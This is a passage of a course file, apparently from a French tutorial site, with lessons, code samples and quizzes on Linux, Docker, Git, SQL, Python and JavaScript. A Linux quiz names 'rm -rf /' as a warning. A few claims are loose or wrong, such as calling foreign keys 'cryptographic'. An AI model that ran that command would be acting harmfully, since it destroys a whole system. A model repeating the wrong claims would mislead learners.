@@ -1,0 +1,3136 @@
+course "linux-basics" {
+  title: "Linux : Le Pouvoir du Terminal"
+  description: "Maîtrisez le système qui fait tourner 96% des serveurs mondiaux. Du premier pwd au scripting avancé."
+  category: linux
+  level: beginner
+  duration: "6h"
+  icon: Terminal
+  keywords: [linux, terminal, bash, commandes, sysadmin]
+
+  module "intro" {
+    title: "Architecture et Commandes Essentielles"
+    duration: 15min
+    content """
+# Architecture et Commandes Essentielles
+
+Linux est le standard de l'industrie pour les infrastructures serveurs. La maîtrise du terminal n'est pas optionnelle pour un ingénieur : elle est le prérequis pour interagir avec des environnements cloud, des pipelines CI/CD et des serveurs de production.
+
+Contrairement aux interfaces graphiques (GUI), l'interface en ligne de commande (CLI) offre un contrôle absolu, une automatisation totale via des scripts shell, et une empreinte mémoire minimale.
+
+---
+
+## Fondamentaux de l'Architecture Linux
+
+Linux est omniprésent :
+
+| Secteur | Exemples d'application | Parts de marché |
+|------|-------------------|-------------|
+| Serveurs Web | Hébergement, APIs | ~96% |
+| Cloud Computing | AWS, GCP, Azure | ~100% |
+| Embarqué / IoT | Routeurs, smart devices | ~80% |
+
+La philosophie UNIX sous-jacente stipule que **tout est fichier** (fichiers textes, périphériques matériels, sockets réseau). Cette abstraction permet de manipuler l'ensemble du système d'exploitation avec un jeu réduit de commandes standards.
+
+---
+
+## Syntaxe d'Exécution
+
+L'exécution d'une commande suit une structure stricte :
+
+```
+commande [options] [arguments]
+```
+
+Exemple pratique :
+```bash
+ls -lah /var/log
+```
+- `ls` : binaire exécutable
+- `-lah` : flags combinés (long format, all, human-readable)
+- `/var/log` : argument (chemin absolu de la cible)
+    """
+    codeblock "bash" {
+      title: "Premier contact avec le terminal Linux"
+      code """
+# Ouvrez votre terminal. C'est votre nouveau cockpit.
+# Chaque commande ci-dessous vous dit quelque chose d'essentiel.
+
+# 1. Qui êtes-vous ? (quel utilisateur est connecté)
+whoami
+# Résultat : alice
+# Si vous voyez 'root', méfiance : vous avez tous les droits, donc tous les risques.
+
+# 2. Où êtes-vous ? (Print Working Directory)
+pwd
+# Résultat : /home/alice
+# Lisez ce chemin de droite à gauche :
+# alice → dans le dossier home → à la racine /
+
+# 3. Quelle machine êtes-vous en train d'utiliser ?
+hostname
+# Résultat : mon-serveur-prod (ou le nom de votre machine)
+
+# 4. Quelle distribution Linux tourne ici ?
+cat /etc/os-release | grep PRETTY_NAME
+# Résultat : PRETTY_NAME="Ubuntu 22.04.3 LTS"
+# LTS = Long Term Support (5 ans de mises à jour de sécurité)
+
+# 5. Version du noyau Linux (le cœur du système)
+uname -r
+# Résultat : 5.15.0-91-generic
+# Ce numéro de version est crucial pour la compatibilité des drivers
+
+# 6. Depuis combien de temps le serveur tourne-t-il ?
+uptime
+# Résultat : 14:32  up 47 days, 3:12, 2 users, load average: 0.08, 0.12, 0.09
+# Un serveur Linux peut tourner des ANNÉES sans redémarrer.
+
+# 7. Combien de mémoire RAM est utilisée ?
+free -h
+# Résultat :
+#               total   utilisé   libre
+# Mem:           7.7G     2.1G    5.6G
+# Swap:          2.0G       0B    2.0G
+
+# 🎉 Vous savez déjà diagnostiquer un serveur en 30 secondes !
+      """
+    }
+    quiz {
+      question "Quelle est la différence entre 'rm -rf /' et 'rm -rf ./' ?" {
+        - "Aucune différence, les deux font la même chose"
+        + "rm -rf / supprime tout le système, rm -rf ./ supprime seulement le dossier courant"
+        - "rm -rf ./ est interdit, rm -rf / est autorisé"
+        - "rm -rf / demande une confirmation, l'autre non"
+        explanation "Le slash (/) représente la racine absolue du système, tandis que le point (.) représente le dossier où vous vous trouvez actuellement."
+      }
+      question "Quelle commande affiche le répertoire dans lequel vous vous trouvez ?" {
+        - "whoami"
+        - "hostname"
+        + "pwd"
+        - "uname"
+      }
+      question "Que signifie 'LTS' dans 'Ubuntu 22.04.3 LTS' ?" {
+        - "Linux Terminal System"
+        + "Long Term Support — version maintenue 5 ans"
+        - "Latest Technology Stack"
+        - "Linux Testing Suite"
+      }
+    }
+  }
+
+  module "navigation" {
+    title: "Naviguer comme un Ninja du Terminal"
+    duration: 25min
+    content """
+# L'Art de la Navigation Sans GPS
+
+Imaginez le système de fichiers Linux comme une ville. La racine `/` est la mairie — le centre absolu. Chaque quartier (`/home`, `/etc`, `/var`) a une fonction précise. Et vous, vous êtes le coursier qui doit s'y retrouver sans jamais sortir de carte.
+
+La bonne nouvelle ? Contrairement à une ville, Linux est **parfaitement logique**. Une fois que vous comprenez la structure, vous ne serez plus jamais perdu.
+
+---
+
+## L'Arborescence Linux : La Carte Mentale Essentielle
+
+```
+/ ← Racine (Root). Point de départ absolu.
+
+ home/ ← Les maisons des utilisateurs
+ alice/ ← Votre espace. Vous y avez tous les droits.
+ Documents/
+ Téléchargements/
+ .ssh/ ← Fichier caché (commence par .) = vos clés SSH
+ bob/
+
+ etc/ ← Editable Text Config : toutes les configs système
+ nginx/ ← Config du serveur web
+ ssh/ ← Config SSH
+ crontab ← Tâches planifiées
+
+ var/ ← Variable data : ce qui change constamment
+ log/ ← Tous les logs système (votre boîte noire)
+ www/ ← Fichiers de sites web
+
+ usr/ ← User System Resources : logiciels installés
+ bin/ ← Les exécutables de vos programmes
+
+ tmp/ ← Temporaire : se vide à chaque redémarrage
+ bin/ ← Binaires essentiels (ls, cat, mkdir...)
+ root/ ← Home du super-utilisateur root (≠ /)
+```
+
+---
+
+## Les Chemins Absolus vs Relatifs
+
+C'est LA distinction fondamentale que tout débutant doit maîtriser :
+
+```
+Chemin ABSOLU → Commence par / → Valide depuis n'importe où
+Chemin RELATIF → Commence sans / → Relatif à votre position actuelle
+
+Exemple :
+Vous êtes dans /home/alice
+
+/home/alice/Documents/rapport.txt ← ABSOLU (toujours valide)
+Documents/rapport.txt ← RELATIF (valide seulement depuis /home/alice)
+./Documents/rapport.txt ← RELATIF avec ./ (même chose, explicite)
+../bob/fichier.txt ← RELATIF avec ../ (remonte d'un niveau)
+```
+
+**Règle pro :** Dans les scripts, utilisez TOUJOURS les chemins absolus. Jamais de surprise selon d'où le script est lancé.
+    """
+    codeblock "bash" {
+      title: "Exercice pratique — Navigation et exploration"
+      code """
+# === MISE EN PLACE DE L'ENVIRONNEMENT DE TEST ===
+mkdir -p ~/tutodecode-lab/{projets/frontend,projets/backend,logs,config}
+touch ~/tutodecode-lab/{README.md,.env,logs/app.log,config/settings.conf}
+echo "Projet TutoDecode" > ~/tutodecode-lab/README.md
+
+
+# === NAVIGATION DE BASE ===
+
+# 1. Aller dans notre lab
+cd ~/tutodecode-lab
+pwd  # Confirme : /home/votre_user/tutodecode-lab
+
+# 2. Lister le contenu (flags utiles)
+ls        # Simple : noms seulement
+ls -l     # Long : permissions + tailles + dates
+ls -a     # All : affiche les fichiers cachés (commençant par .)
+ls -lah   # Combiné : long + all + tailles lisibles (M, G...)
+# Vous devriez voir .env qui était caché !
+
+# 3. Explorer la structure
+find . -type f          # Tous les fichiers
+find . -type d          # Tous les dossiers
+find . -name "*.log"    # Fichiers .log uniquement
+
+# 4. Autocomplétion avec TAB (votre meilleur ami)
+cd pro  # Appuyez sur TAB → complète en 'projets/'
+cd pro<TAB>/fr<TAB>  # Navigue jusqu'à projets/frontend en 2 TAB
+
+# 5. Raccourcis de navigation indispensables
+cd ~          # Va dans /home/votre_user (home)
+cd           # Raccourci encore plus court pour home
+cd -         # Rebondit vers le répertoire PRÉCÉDENT (très utile !)
+cd ..        # Remonte d'un niveau
+cd ../..     # Remonte de deux niveaux
+
+# === DÉMONSTRATION cd - ===
+cd /etc      # Vous allez dans /etc
+cd /var/log  # Vous allez dans /var/log
+cd -         # Retour à /etc (pratique !)
+cd -         # Retour à /var/log
+# cd - est votre bouton "retour" du navigateur
+
+# === NETTOYAGE ===
+rm -rf ~/tutodecode-lab
+echo "Lab supprimé proprement."
+      """
+    }
+    quiz {
+      question "Quelle est la différence entre un chemin absolu et un chemin relatif ?" {
+        + "Le chemin absolu commence par / et est valide partout, le relatif dépend de votre position"
+        - "Le chemin absolu est plus court, le relatif est plus long"
+        - "Le chemin absolu ne fonctionne qu'en root"
+        - "Il n'y a pas de différence en pratique"
+      }
+      question "Que contient le répertoire /etc sous Linux ?" {
+        - "Les fichiers temporaires du système"
+        - "Les homes des utilisateurs"
+        + "Les fichiers de configuration système"
+        - "Les binaires exécutables"
+      }
+      question "Que fait 'cd -' ?" {
+        - "Va à la racine du système"
+        + "Retourne au répertoire précédent (bouton retour)"
+        - "Supprime le répertoire courant"
+        - "Affiche l'aide de la commande cd"
+      }
+    }
+  }
+
+}
+
+course "docker-intro" {
+  title: "Docker : Déployer Sans Friction"
+  description: "L'outil qui a sauvé des milliers de développeurs du cauchemar 'Ça marche sur ma machine'. Conteneurisation from scratch."
+  category: devops
+  level: intermediate
+  duration: "4h"
+  icon: Box
+  keywords: [docker, conteneurs, devops, deploiement, microservices]
+
+  module "intro" {
+    title: "Fondamentaux de la Conteneurisation"
+    duration: 20min
+    content """
+# Fondamentaux de la Conteneurisation
+
+La conteneurisation résout le problème fondamental de la parité entre les environnements de développement, de staging et de production. Docker standardise le déploiement en encapsulant l'application et l'intégralité de ses dépendances (bibliothèques système, runtime) dans un artefact immuable.
+
+---
+
+## Architecture : Conteneurs vs Machines Virtuelles
+
+Les conteneurs diffèrent radicalement des machines virtuelles (VM) par leur rapport au noyau du système hôte (kernel).
+
+| Caractéristique | Machine Virtuelle | Conteneur Docker |
+|----------------|----------|-------------|
+| **Isolation** | Hyperviseur + OS complet | Namespaces Linux + Cgroups |
+| **Empreinte** | Gigaoctets (GB) | Mégaoctets (MB) |
+| **Démarrage** | Minutes | Millisecondes |
+
+En partageant le noyau hôte, Docker supprime l'overhead matériel tout en garantissant l'isolation des processus (PID namespace) et du réseau (Network namespace).
+
+---
+
+## Concepts Fondamentaux
+
+1. **Image** : Artefact statique en lecture seule, construit en couches (layers) via un `Dockerfile`.
+2. **Conteneur** : Instance d'exécution éphémère d'une image, avec une fine couche de lecture/écriture (Copy-on-Write).
+3. **Registry** : Dépôt centralisé d'images (ex: Docker Hub, AWS ECR, GitLab Registry).
+    """
+    codeblock "bash" {
+      title: "Premiers pas avec Docker — conteneur en 5 minutes"
+      code """
+# === VÉRIFICATION DE L'INSTALLATION ===
+docker --version
+# Docker version 24.0.7, build afdd53b
+docker info | grep -E 'Server Version|Containers|Images'
+
+
+# === VOTRE PREMIER CONTENEUR ===
+
+# Hello World Docker
+docker run hello-world
+# Que se passe-t-il ?
+# 1. Docker cherche l'image 'hello-world' en local → absente
+# 2. Docker la télécharge depuis Docker Hub automatiquement
+# 3. Docker crée un conteneur à partir de cette image
+# 4. Le conteneur s'exécute, affiche un message, puis s'arrête
+
+
+# === CAS CONCRET : SERVEUR WEB NGINX ===
+
+# Lancer nginx en arrière-plan
+docker run -d \
+  --name mon-site \
+  -p 8080:80 \
+  nginx:alpine
+# -d          : detached, tourne en arrière-plan
+# --name      : donne un nom au conteneur (plus pratique que l'ID)
+# -p 8080:80  : port_hôte:port_conteneur
+# nginx:alpine : image nginx basée sur Alpine (très légère, ~7MB)
+
+# Vérifiez dans votre navigateur : http://localhost:8080
+# Vous devriez voir la page de bienvenue nginx !
+
+# Voir les conteneurs actifs
+docker ps
+# CONTAINER ID   IMAGE          COMMAND   CREATED   STATUS   PORTS                  NAMES
+# a3f2b1c4d5e6   nginx:alpine   ...       ...       Up...    0.0.0.0:8080->80/tcp   mon-site
+
+# Voir les logs du conteneur
+docker logs mon-site
+docker logs -f mon-site  # -f = follow (temps réel)
+
+# Entrer dans le conteneur (comme un SSH)
+docker exec -it mon-site sh
+# -i : interactif
+# -t : pseudo-terminal
+# sh : shell à exécuter (Alpine n'a pas bash par défaut)
+# exit pour sortir
+
+# Arrêter et supprimer
+docker stop mon-site
+docker rm mon-site
+# Ou en une commande :
+docker rm -f mon-site
+      """
+    }
+    quiz {
+      question "Quelle est la différence entre une Image Docker et un Conteneur Docker ?" {
+        - "Ce sont deux noms pour la même chose"
+        + "L'image est un blueprint immuable, le conteneur est une instance vivante créée à partir de l'image"
+        - "Le conteneur est stocké sur Docker Hub, l'image tourne sur la machine"
+        - "L'image est plus grande que le conteneur"
+      }
+      question "Que signifie le flag '-p 8080:80' dans 'docker run -p 8080:80 nginx' ?" {
+        - "Nginx écoute sur le port 8080, exposé en 80 sur le réseau"
+        + "Le port 8080 de la machine hôte est redirigé vers le port 80 du conteneur"
+        - "Le conteneur utilise 8080 MB de mémoire"
+        - "8080 et 80 sont deux conteneurs différents"
+      }
+      question "Pourquoi les conteneurs Docker démarrent-ils en moins d'une seconde, contrairement aux VMs ?" {
+        - "Ils utilisent du hardware dédié plus rapide"
+        + "Ils partagent le kernel du système hôte et n'ont pas besoin de démarrer un OS complet"
+        - "Docker compresse les données pour les charger plus vite"
+        - "Les conteneurs tournent en RAM uniquement"
+      }
+    }
+  }
+
+}
+
+course "git-github" {
+  title: "Git & GitHub : Maîtriser le Temps"
+  description: "Ne perdez plus jamais votre code. Apprenez le versioning qui sauve des carrières et des projets."
+  category: devops
+  level: beginner
+  duration: "3h"
+  icon: Code
+  keywords: [git, github, versioning, collaboration, branches]
+
+  module "intro" {
+    title: "Système de Versionning et Collaboration"
+    duration: 15min
+    content """
+# Système de Versionning Distribué
+
+Git est le standard de l'industrie pour le contrôle de version distribué (VCS). Il garantit la traçabilité des modifications, permet la collaboration asynchrone sur une même base de code, et fournit les mécanismes nécessaires à l'intégration continue (CI).
+
+Contrairement aux systèmes centralisés (SVN), Git clone l'intégralité du dépôt et de son historique en local, rendant les opérations cryptographiquement sécurisées et extrêmement rapides.
+
+---
+
+## Modèle Conceptuel : Les 3 Zones
+
+L'architecture de Git repose sur la transition d'états entre trois zones distinctes :
+
+```
+ Working Directory → Staging Area (Index) → Repository (HEAD)
+ (Fichiers locaux)   (Fichiers indexés)     (Historique figé)
+
+       [git add]             [git commit]
+```
+
+L'index (Staging Area) permet une granularité fine : il isole précisément les modifications qui constitueront la prochaine transaction atomique (commit), sans obliger à valider l'ensemble du répertoire de travail.
+
+---
+
+## Conventions de Commit
+
+La lisibilité de l'historique est critique pour le debug (via `git bisect`) et la génération de changelogs. La norme **Conventional Commits** est largement adoptée :
+
+```text
+feat: ajout du middleware d'authentification JWT
+fix: résolution du memory leak sur la route /export
+docs: mise à jour du diagramme d'architecture
+refactor: optimisation de l'algorithme de tri O(n log n)
+```
+    """
+    codeblock "bash" {
+      title: "Premier dépôt Git — workflow complet"
+      code """
+# === CONFIGURATION INITIALE (une seule fois par machine) ===
+git config --global user.name "Alice Dupont"
+git config --global user.email "alice@example.com"
+git config --global init.defaultBranch main
+git config --global core.editor "code --wait"  # VS Code comme éditeur
+
+# Vérifier la configuration
+git config --list
+
+
+# === CRÉER UN PROJET ===
+mkdir mon-projet && cd mon-projet
+git init
+# Initialized empty Git repository in /home/alice/mon-projet/.git/
+# Le dossier .git est l'ADN de votre repo. Ne jamais le toucher manuellement.
+
+git status
+# On branch main — vous êtes sur la branche principale
+# No commits yet — historique vide
+# nothing to commit — aucune modification détectée
+
+
+# === PREMIER COMMIT ===
+echo "# Mon Projet" > README.md
+echo "node_modules/" > .gitignore  # Fichiers à ne JAMAIS versionner
+
+git status
+# Untracked files: README.md, .gitignore (nouveaux fichiers non suivis)
+
+git add README.md .gitignore
+# OU pour tout ajouter :
+# git add .   ← Pratique mais à utiliser avec précaution
+
+git status
+# Changes to be committed: (ready to commit !)
+#   new file: README.md
+#   new file: .gitignore
+
+git commit -m "feat: initialisation du projet avec README"
+# [main (root-commit) a1b2c3d] feat: initialisation du projet avec README
+
+
+# === CYCLE QUOTIDIEN ===
+# Modifier un fichier
+echo "## Installation" >> README.md
+echo "npm install" >> README.md
+
+# Voir exactement ce qui a changé (essentiel avant tout commit)
+git diff
+# Les lignes en vert (+) sont ajoutées, en rouge (-) supprimées
+
+git add README.md
+git commit -m "docs: ajout des instructions d'installation"
+
+
+# === EXPLORER L'HISTORIQUE ===
+git log                    # Historique complet avec auteur, date, message
+git log --oneline          # Une ligne par commit (vue d'ensemble)
+git log --oneline --graph  # Graphe visuel des branches
+# a1b2c3d (HEAD -> main) docs: ajout des instructions d'installation
+# f4e5d6c feat: initialisation du projet avec README
+
+
+# === ANNULER DES MODIFICATIONS ===
+# Cas 1 : fichier modifié pas encore stagé → restaurer
+git restore README.md
+
+# Cas 2 : fichier stagé → déstaguer
+git restore --staged README.md
+
+# Cas 3 : annuler le dernier commit (garde les modifications)
+git revert HEAD
+
+# Voir une version passée d'un fichier
+git show HEAD~2:README.md  # README.md d'il y a 2 commits
+      """
+    }
+    quiz {
+      question "Pourquoi la Staging Area (zone d'index) existe-t-elle dans Git ?" {
+        - "C'est une zone tampon obligatoire sans intérêt pratique"
+        + "Elle permet de choisir précisément quels fichiers inclure dans le prochain commit"
+        - "Elle synchronise automatiquement avec GitHub"
+        - "Elle stocke les backups automatiques"
+      }
+      question "Quelle commande permet de voir exactement les lignes modifiées avant de committer ?" {
+        - "git status"
+        - "git log"
+        + "git diff"
+        - "git show"
+      }
+      question "Quelle est la convention de message 'feat: ajout du login' ?" {
+        - "Une obligation technique imposée par Git"
+        + "La convention Conventional Commits, standard dans les équipes pro"
+        - "Un format propre à GitHub uniquement"
+        - "Une abréviation de 'feature file'"
+      }
+    }
+  }
+
+}
+
+course "sql-basics" {
+  title: "SQL : Parler aux Bases de Données"
+  description: "Apprenez le langage universel des données. De SELECT * aux requêtes optimisées qui ne font pas pleurer le DBA."
+  category: sql
+  level: beginner
+  duration: "4h"
+  icon: Database
+  keywords: [sql, database, mysql, postgresql, requetes]
+
+  module "intro" {
+    title: "Principes des Bases de Données Relationnelles"
+    duration: 15min
+    content """
+# Principes des Bases de Données Relationnelles
+
+SQL (Structured Query Language) est le langage déclaratif standard pour l'interaction avec les systèmes de gestion de bases de données relationnelles (SGBDR). Une compréhension approfondie de SQL est impérative pour garantir l'intégrité, la sécurité et les performances d'accès aux données.
+
+---
+
+## Architecture Relationnelle
+
+Le modèle relationnel repose sur la structuration stricte des données en tables, reliées par des contraintes cryptographiques d'intégrité référentielle.
+
+- **Clé Primaire (Primary Key)** : Identifiant unique et immuable d'un enregistrement (souvent indexé par défaut via B-Tree).
+- **Clé Étrangère (Foreign Key)** : Référence stricte vers une clé primaire d'une autre table, garantissant l'intégrité relationnelle et interdisant les états orphelins.
+
+---
+
+## Opérations CRUD et Bonnes Pratiques
+
+| Opération | Commande SQL | Impact | Tolérance à l'erreur |
+|-----------|--------------|--------|----------|
+| **Create** | `INSERT` | Ajout d'états | Haute (rejet par contraintes) |
+| **Read** | `SELECT` | Lecture seule | Modérée (risque de full table scan) |
+| **Update** | `UPDATE` | Mutation d'états| Critique (WHERE obligatoire) |
+| **Delete** | `DELETE` | Suppression | Très critique (WHERE obligatoire) |
+
+**Avertissement de production :** Toute opération de mutation (`UPDATE`, `DELETE`) doit systématiquement être précédée d'un `SELECT` exploitant la même clause `WHERE`, afin de valider le scope de la transaction avant exécution.
+    """
+    codeblock "sql" {
+      title: "Exploration SQL — premières requêtes"
+      code """
+-- === EXPLORATION D'UNE BASE ===
+
+-- Voir toutes les bases disponibles
+SHOW DATABASES;
+
+-- Choisir la base de travail
+USE tutodecode;
+
+-- Voir toutes les tables
+SHOW TABLES;
+
+-- Comprendre la structure d'une table
+DESCRIBE users;
+-- Résultat :
+-- Field         Type          Null  Key  Default
+-- id            int(11)       NO    PRI  NULL
+-- email         varchar(255)  NO    UNI  NULL
+-- vip           tinyint(1)    YES        0
+-- created_at    datetime      YES        NULL
+
+
+-- === SELECT : LIRE LES DONNÉES ===
+
+-- ⚠️ À éviter en production (récupère tout)
+SELECT * FROM users;
+
+-- ✅ La bonne façon : colonnes explicites + limite
+SELECT id, email, created_at
+FROM users
+LIMIT 10;
+
+-- Filtrer avec WHERE
+SELECT id, email
+FROM users
+WHERE vip = true
+  AND created_at >= '2024-01-01'
+ORDER BY created_at DESC
+LIMIT 100;
+
+-- Compter les lignes (plus rapide que SELECT *)
+SELECT COUNT(*) AS total_vip
+FROM users
+WHERE vip = true;
+-- Résultat : total_vip = 1247
+
+
+-- === INSERT : AJOUTER DES DONNÉES ===
+
+-- Toujours spécifier les colonnes explicitement
+INSERT INTO users (email, vip, created_at)
+VALUES ('alice@example.com', false, NOW());
+
+-- Insérer plusieurs lignes en une fois (plus performant)
+INSERT INTO users (email, vip, created_at) VALUES
+  ('bob@example.com', false, NOW()),
+  ('carol@example.com', true, NOW()),
+  ('dan@example.com', false, NOW());
+
+
+-- === UPDATE : MODIFIER DES DONNÉES ===
+
+-- ⚠️ TOUJOURS vérifier avec SELECT d'abord :
+SELECT id, email, vip FROM users WHERE email = 'alice@example.com';
+-- Si le résultat est correct, alors :
+UPDATE users
+SET vip = true
+WHERE email = 'alice@example.com';
+-- 1 row(s) affected. (exactement ce qu'on voulait)
+
+-- ❌ CATASTROPHE sans WHERE :
+-- UPDATE users SET vip = true;
+-- → Tous les utilisateurs deviennent VIP. Irrécupérable.
+
+
+-- === DELETE : SUPPRIMER DES DONNÉES ===
+
+-- Toujours tester avec SELECT avant :
+SELECT * FROM users WHERE created_at < '2020-01-01' AND vip = false;
+-- 42 lignes. C'est bien ce qu'on veut supprimer.
+
+DELETE FROM users
+WHERE created_at < '2020-01-01'
+  AND vip = false;
+-- 42 row(s) affected.
+      """
+    }
+    quiz {
+      question "Quelle est la bonne pratique AVANT d'exécuter un DELETE ou UPDATE en production ?" {
+        - "Faire un git commit"
+        + "Exécuter d'abord un SELECT avec la même condition WHERE pour vérifier les lignes concernées"
+        - "Prévenir le client par email"
+        - "Vérifier que le serveur a assez de RAM"
+      }
+      question "Pourquoi la requête 'SELECT * FROM users JOIN orders JOIN products' était-elle catastrophique ?" {
+        - "Parce que SELECT * est interdit"
+        + "Parce que les JOINs sur de grandes tables sans index causent un full table scan, bloquant la base"
+        - "Parce qu'il manquait un point-virgule"
+        - "Parce que JOIN ne fonctionne qu'avec deux tables maximum"
+      }
+      question "Qu'est-ce qu'une clé étrangère dans une base de données relationnelle ?" {
+        - "Un mot de passe pour accéder à une table"
+        + "Une colonne qui référence la clé primaire d'une autre table, créant un lien entre elles"
+        - "Un index qui accélère les recherches"
+        - "Un type de chiffrement des données"
+      }
+    }
+  }
+
+}
+
+course "python-basics" {
+  title: "Python : Le Couteau Suisse du Code"
+  description: "Le langage le plus populaire au monde. De l'automatisation simple à l'IA avancée, Python fait tout."
+  category: python
+  level: beginner
+  duration: "5h"
+  icon: Code
+  keywords: [python, programmation, scripting, ia, data]
+
+  module "intro" {
+    title: "Automatisation et Écosystème Python"
+    duration: 15min
+    content """
+# Automatisation et Écosystème Python
+
+Python s'est imposé comme le langage dominant dans l'écosystème technologique moderne. Son approche multi-paradigmes (impératif, orienté objet, fonctionnel) et sa syntaxe claire permettent de concevoir rapidement de l'outillage DevOps, des architectures backend et des pipelines Data/IA complexes.
+
+---
+
+## Positionnement et Cas d'Usage
+
+La force de Python réside dans sa vaste bibliothèque standard (batteries included) et son écosystème de paquets (PyPI). 
+
+| Domaine d'ingénierie | Écosystème de référence |
+|---------|------------------|
+| **Data Engineering & IA** | `numpy`, `pandas`, `pytorch`, `tensorflow` |
+| **Backend Web & APIs** | `fastapi`, `django`, `flask` |
+| **DevOps & Infrastructure** | `ansible`, `boto3`, scripts d'orchestration |
+| **CyberSécurité & OSINT** | `requests`, `scapy`, outils cryptographiques |
+
+---
+
+## Philosophie d'Architecture (Le Zen de Python)
+
+Le design de Python privilégie explicitement la lisibilité du code source. Contrairement aux langages qui favorisent la densité (comme Perl ou C++), Python force l'indentation structurelle.
+
+Principes fondamentaux (`import this`) :
+- Explicite vaut mieux qu'implicite.
+- Simple vaut mieux que complexe.
+- Il devrait y avoir de préférence une seule manière évidente d'implémenter une solution.
+    """
+    codeblock "python" {
+      title: "Python essentiel — types, fonctions, gestion d'erreurs"
+      code """
+# Python s'exécute ligne par ligne. Pas de compilation.
+# Pas de déclaration de types. Juste écrire et lancer.
+
+# ============================================================
+# 1. LES TYPES DE BASE
+# ============================================================
+
+# Pas besoin de déclarer le type — Python l'infère
+nombre_entier = 42
+nombre_decimal = 3.14
+texte = "Bonjour TutoDecode"
+booleen = True
+rien = None  # L'équivalent de null
+
+print(type(nombre_entier))  # <class 'int'>
+print(type(texte))          # <class 'str'>
+
+# ============================================================
+# 2. LES F-STRINGS (formatage moderne)
+# ============================================================
+
+nom = "Alice"
+age = 28
+solde = 1234.567
+
+# La façon moderne et lisible
+print(f"Utilisateur : {nom}, {age} ans")
+print(f"Solde : {solde:.2f} €")  # .2f = 2 décimales → 1234.57 €
+print(f"L'âge en binaire : {age:b}")  # → 11100
+
+# ============================================================
+# 3. LES LISTES (tableaux dynamiques)
+# ============================================================
+
+cours = ["Linux", "Docker", "Python", "SQL"]
+
+cours.append("Git")       # Ajoute à la fin
+cours.insert(0, "Intro")  # Insère au début
+cours.remove("SQL")       # Supprime par valeur
+
+print(cours[0])    # Premier : "Intro"
+print(cours[-1])   # Dernier : "Git"
+print(cours[1:3])  # Slice : ["Linux", "Docker"]
+
+# List comprehension (la magie Python)
+lengths = [len(c) for c in cours]  # Longueur de chaque cours
+print(lengths)  # [5, 5, 6, 6, 3]
+
+# ============================================================
+# 4. LES DICTIONNAIRES (clé → valeur)
+# ============================================================
+
+utilisateur = {
+    "nom": "Alice",
+    "email": "alice@example.com",
+    "age": 28,
+    "actif": True,
+    "cours": cours  # Les listes et dicos peuvent s'imbriquer
+}
+
+print(utilisateur["email"])          # alice@example.com
+print(utilisateur.get("tel", "N/A")) # N/A (clé absente → valeur par défaut)
+
+# Itérer sur un dict
+for cle, valeur in utilisateur.items():
+    print(f"{cle}: {valeur}")
+
+# ============================================================
+# 5. FONCTIONS
+# ============================================================
+
+def calculer_prix_ttc(prix_ht: float, taux: float = 0.20) -> float:
+    """Calcule le prix TTC. taux = 0.20 par défaut (TVA française)."""
+    return prix_ht * (1 + taux)
+
+print(calculer_prix_ttc(100))         # 120.0
+print(calculer_prix_ttc(100, 0.055))  # 105.5 (TVA réduite)
+
+# ============================================================
+# 6. GESTION D'ERREURS
+# ============================================================
+
+def diviser(a, b):
+    try:
+        return a / b
+    except ZeroDivisionError:
+        print("Erreur : division par zéro")
+        return None
+    finally:
+        print("Opération terminée")  # S'exécute toujours
+
+print(diviser(10, 2))   # 5.0
+print(diviser(10, 0))   # Gère l'erreur proprement
+
+# 🎉 Vous venez de couvrir 80% du Python quotidien !
+      """
+    }
+    quiz {
+      question "Que fait cette instruction Python : `[len(c) for c in cours]` ?" {
+        - "Supprime les éléments vides de la liste cours"
+        + "Crée une nouvelle liste avec la longueur de chaque élément de cours"
+        - "Trie la liste cours par longueur"
+        - "Compte le nombre total de caractères"
+      }
+      question "Quelle est la différence entre `dict['cle']` et `dict.get('cle', 'defaut')` ?" {
+        - "Aucune différence fonctionnelle"
+        + "dict['cle'] lève une erreur si la clé est absente, dict.get() retourne la valeur par défaut"
+        - "dict.get() est plus lent"
+        - "dict['cle'] ne fonctionne qu'avec des clés numériques"
+      }
+      question "Pourquoi Python utilise-t-il l'indentation (les espaces) à la place des accolades `{}` ?" {
+        - "C'est une limitation technique de l'interpréteur"
+        + "Pour forcer la lisibilité et l'uniformité du code — c'est la philosophie Python"
+        - "Pour être compatible avec les anciens systèmes"
+        - "Pour réduire la taille des fichiers"
+      }
+    }
+  }
+
+}
+
+course "javascript-modern" {
+  title: "JavaScript Moderne : Maîtriser le Web"
+  description: "Le seul langage du navigateur. ES6+, async/await, et les patterns qui font la différence entre junior et senior."
+  category: javascript
+  level: intermediate
+  duration: "5h"
+  icon: Code
+  keywords: [javascript, es6, async, web, frontend]
+
+  module "intro" {
+    title: "Asynchronisme et Écosystème Web"
+    duration: 15min
+    content """
+# Asynchronisme et Écosystème Web
+
+JavaScript (ECMAScript) est le moteur exécutif exclusif des navigateurs web et un acteur majeur du backend (Node.js, Deno). La norme ES6 (2015) et ses itérations successives ont profondément modernisé le langage, introduisant des structures de données fortes et des paradigmes de gestion asynchrone robustes.
+
+---
+
+## L'Event Loop et le Modèle Non-Bloquant
+
+JavaScript est fondamentalement **mono-thread** (single-threaded). La concurrence est gérée via une Event Loop asynchrone non-bloquante.
+
+1. **Call Stack** : Empilement des frames d'exécution synchrones.
+2. **Web APIs / Libuv** : Délégation des opérations I/O (réseau, timers, système de fichiers).
+3. **Task Queue & Microtask Queue** : File d'attente des callbacks résolus (les Promesses ayant priorité via les microtasks).
+
+Lorsqu'une requête réseau est initiée, le thread principal n'est jamais bloqué. L'Event Loop réinjectera la callback dans la Call Stack uniquement lorsque celle-ci sera vide.
+
+---
+
+## ES6+ : Modernisation du Langage
+
+L'usage de `var` est obsolète en raison de son scope fonctionnel imprévisible (hoisting). L'ingénierie moderne impose :
+- `const` : Référence immuable (par défaut).
+- `let` : Variable à scope de bloc (uniquement en cas de mutation justifiée).
+
+La gestion asynchrone est passée des callbacks imbriquées aux Promises, puis à la syntaxe `async/await`, permettant une lecture quasi-synchrone du flux d'opérations tout en maintenant les performances I/O.
+    """
+    codeblock "javascript" {
+      title: "JavaScript moderne — patterns fondamentaux"
+      code """
+// ============================================================
+// 1. DESTRUCTURING — Extraire proprement
+// ============================================================
+
+// Objet
+const utilisateur = { nom: 'Alice', age: 28, ville: 'Paris', role: 'admin' };
+const { nom, age, role = 'user' } = utilisateur;  // role par défaut : 'user'
+console.log(nom, age, role);  // Alice 28 admin
+
+// Renommer à la volée
+const { nom: username, age: annees } = utilisateur;
+console.log(username, annees);  // Alice 28
+
+// Tableau
+const [premier, deuxième, ...reste] = [1, 2, 3, 4, 5];
+console.log(premier);  // 1
+console.log(reste);    // [3, 4, 5]
+
